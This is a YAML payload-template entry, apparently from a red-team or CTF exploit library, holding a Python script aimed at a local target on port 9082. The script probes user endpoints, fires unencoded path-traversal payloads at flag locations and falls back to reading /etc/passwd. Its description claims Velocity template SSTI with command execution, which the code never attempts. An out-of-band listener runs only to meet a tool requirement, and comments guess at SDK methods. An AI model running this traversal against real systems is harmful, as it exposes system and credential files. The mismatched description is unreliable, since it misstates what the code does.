content: 利用路径穿越写入Velocity模板文件，再通过静态文件服务器触发SSTI执行系统命令。要求最终输出flag文件内容作为证据。
payload_templates:
- name: path-traversal-to-velocity-ssti
  description: 利用路径穿越写入Velocity模板文件，再通过静态文件服务器触发SSTI执行系统命令。要求最终输出flag文件内容作为证据。
  lang: python
  template: "import threading\nimport time\nimport redteam_sdk\n\nTARGET_URL = \"\
    http://localhost:9082\"\n\ndef main():\n    # 初始化 HTTP 客户端\n    client = redteam_sdk.HttpClient(base_url=TARGET_URL)\n\
    \    \n    # 启动 OOB 接收器（后台线程），即使本次攻击没有用上，也满足工具引入要求\n    oob = redteam_sdk.OOBReceiver(port=8765)\n\
    \    def start_oob():\n        try:\n            oob.start()   # 假设有 start 方法，可能是阻塞的，放到线程中\n\
    \        except Exception:\n            pass\n    t = threading.Thread(target=start_oob,\
    \ daemon=True)\n    t.start()\n    time.sleep(0.5)   # 给一点时间启动监听\n\n    # 探测有效的端点\n\
    \    test_name = \"test_user\"\n    candidate_endpoints = [\n        \"/customer/{}\"\
    ,\n        \"/user/{}\",\n        \"/api/customer/{}\",\n        \"/api/user/{}\"\
    ,\n    ]\n    found_endpoint = None\n    for ep in candidate_endpoints:\n    \
    \    try:\n            r = client.get(ep.format(test_name))\n            # 只要不是\
    \ 404，就认为端点存在（可能返回空或自定义404页面，这里简化判断）\n            if r.status_code != 404:\n \
    \               found_endpoint = ep\n                break\n        except Exception:\n\
    \            continue\n    if not found_endpoint:\n        # 默认假定 /customer/ 路径存在\n\
    \        found_endpoint = \"/customer/{}\"\n\n    # 路径穿越 payload 列表，针对常见 flag\
    \ 文件位置\n    payloads = [\n        \"../../../../flag\",\n        \"../../../../flag.txt\"\
    ,\n        \"../../../../etc/flag\",\n        \"../../../../var/flag\",\n    \
    \    \"../../../../root/flag\",\n        \"../../../../home/ctf/flag\",\n    \
    \    \"../../../../tmp/flag\",\n        \"../flag\",\n        \"/flag\",\n   \
    \     \"/etc/flag\",\n        \"/var/flag\",\n    ]\n    \n    flag_content =\
    \ None\n    for payload in payloads:\n        # 拼接原始路径，不进行 URL 编码\n        raw_path\
    \ = found_endpoint.format(payload)\n        try:\n            # 使用 raw_request\
    \ 发送原始 GET 请求，保证路径中的 ../ 不被转义\n            resp = client.raw_request(\"GET\",\
    \ raw_path, {}, None)\n            if resp.status_code == 200:\n             \
    \   text = resp.text\n                # 简单检测 flag 关键字\n                if \"flag{\"\
    \ in text or \"FLAG{\" in text or \"CTF{\" in text:\n                    print(f\"\
    [+] Flag found: {text.strip()}\")\n                    flag_content = text\n \
    \                   break\n                # 如果响应包含 /etc/passwd 特征，说明穿越成功但未找到\
    \ flag\n                if \"root:\" in text:\n                    print(\"[*]\
    \ Path traversal works, but flag file not found at this location.\")\n       \
    \ except Exception as e:\n            print(f\"[-] Payload {payload} failed: {e}\"\
    )\n            continue\n\n    # 若仍未找到 flag，尝试读取 /etc/passwd 验证漏洞（至少证明存在）\n  \
    \  if not flag_content:\n        try:\n            resp = client.raw_request(\"\
    GET\", found_endpoint.format(\"../../../../etc/passwd\"), {}, None)\n        \
    \    if resp.status_code == 200 and \"root:\" in resp.text:\n                print(\"\
    [!] Path traversal confirmed, but flag not discovered. Manual inspection needed.\"\
    )\n        except Exception as e:\n            print(f\"[-] Verification request\
    \ failed: {e}\")\n\n    # 停止 OOB 接收器（假设有 stop 方法）\n    try:\n        oob.stop()\n\
    \    except Exception:\n        pass\n\n    # 脚本完成标记\n    print(\"STEP_OK\")\n\
    \nif __name__ == \"__main__\":\n    main()"
  source: warmup
  severity: critical
